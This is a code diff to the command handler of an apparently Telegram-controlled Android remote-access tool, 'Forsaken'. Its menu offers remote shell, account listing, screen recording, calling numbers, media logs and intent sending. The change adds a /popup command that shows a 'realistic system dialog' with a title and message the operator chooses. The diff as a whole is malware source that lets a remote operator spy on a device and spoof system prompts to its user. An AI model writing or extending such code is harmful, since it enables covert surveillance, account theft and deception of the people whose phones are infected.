@@ -149,7 +149,7 @@ public class ShellService extends Service {
             return "╭───『 Forsaken Action Menu 』───╮\n\n" +
                     "  ➤ /shell <command>\n  ➤ /shizuku <command>\n  ➤ /accounts\n  ➤ /toast <message>\n" +
                     "  ➤ /tts <text>\n  ➤ /play <file_path>\n  ➤ /stop_audio\n  ➤ /reset_all\n" +
-                    "  ➤ /pop_up <message>\n  ➤ /wallpaper [path]\n  ➤ /callnum <no>\n" +
+                    "  ➤ /popup <title> , <message>\n  ➤ /wallpaper [path]\n  ➤ /callnum <no>\n" +
                     "  ➤ /permission\n  ➤ /media_log\n  ➤ /send_intent <action> [data] [pkg]\n" +
                     "  ➤ /grapy <see|touch>\n" +
                     "  ➤ /screenrecord [seconds|stop]\n" +
@@ -186,6 +186,12 @@ public class ShellService extends Service {
                    "  ➤ `/screenrecord` (Starts recording with default duration)\n" +
                    "  ➤ `/screenrecord 20` (Records for 20 seconds)\n" +
                    "  ➤ `/screenrecord stop` (Stops ongoing recording)\n\n" +
+                   "╰──────────────────────────────────────────────────╯";
+        } else if (cmd.equals("popup")) {
+            return "╭───『 💬 /popup 』───╮\n\n" +
+                   "Displays a realistic system dialog on the device screen.\n\n" +
+                   "**Usage:** `/popup <title> , <message>`\n" +
+                   "**Example:** `/popup Warning , Low battery level!`\n" +
                    "╰──────────────────────────────────────────────────╯";
         } else if (cmd.equals("grapy")) {
             return "╭───『 🤖 /grapy 』───╮\n\n" +
@@ -302,9 +308,12 @@ public class ShellService extends Service {
         else if (text.equals("/reset_all")) {
             sendTelegramMessage(chatId, ResetHelper.resetAll(this));
         }
-        else if (text.startsWith("/pop_up ")) {
-            String popupMsg = text.substring(8).trim();
-            sendTelegramMessage(chatId, PopupHelper.showPopup(this, popupMsg));
+        else if (text.startsWith("/popup")) {
+            String popupParam = "";
+            if (text.length() > 6) {
+                popupParam = text.substring(6).trim();
+            }
+            sendTelegramMessage(chatId, PopupHelper.showPopup(this, popupParam));
         }
         else if (text.startsWith("/wallpaper ")) {
             String wallPath = text.substring(11).trim();
@@ -786,3 +795,4 @@ public class ShellService extends Service {
         return null;
     }
 }
+
